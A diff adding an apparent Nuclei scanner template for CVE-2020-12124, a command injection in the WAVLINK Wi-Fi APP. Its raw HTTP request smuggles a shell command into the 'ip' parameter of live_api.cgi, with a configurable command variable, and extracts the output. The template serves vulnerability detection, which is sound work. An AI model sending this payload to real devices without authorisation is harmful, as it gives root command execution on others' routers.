@@ -1,0 +1,44 @@
+id: wavlink-wifiapp-rce
+info:
+  name: WAVLINK Wi-Fi APP RCE (CVE-2020-12124)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The unauthenticated endpoint in the WAVLINK Wi-Fi APP, /cgi-bin/live_api.cgi, contains a command line injection vulnerability that allows unauthenticated users to execute arbitrary shell commands as root.
+  tags: command-execution,rce
+  reference:
+    - https://cerne.xyz/bugs/cve-2020-12124
+  classification:
+    cve-id: CVE-2020-12124
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  remediation: |
+    1. Monitor the manufacturer's homepage for updates: https://www.wavlink.com/en_us/index.html
+    2. Configure firewalls to allow only whitelisted access.
+    3. Restrict unnecessary public network access to the system.
+variables:
+  cmd: "id"
+http:
+  - raw:
+      - |
+        GET /cgi-bin/live_api.cgi?page=abc&id=173&ip=;{{cmd}}; HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/etc_ro/lighttpd/www/cgi-bin"
+      - type: word
+        part: body
+        words:
+          - "get_cli_signal"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "var get_cli_signal;\\n(.*?)\\nfunction"
+        group: 1
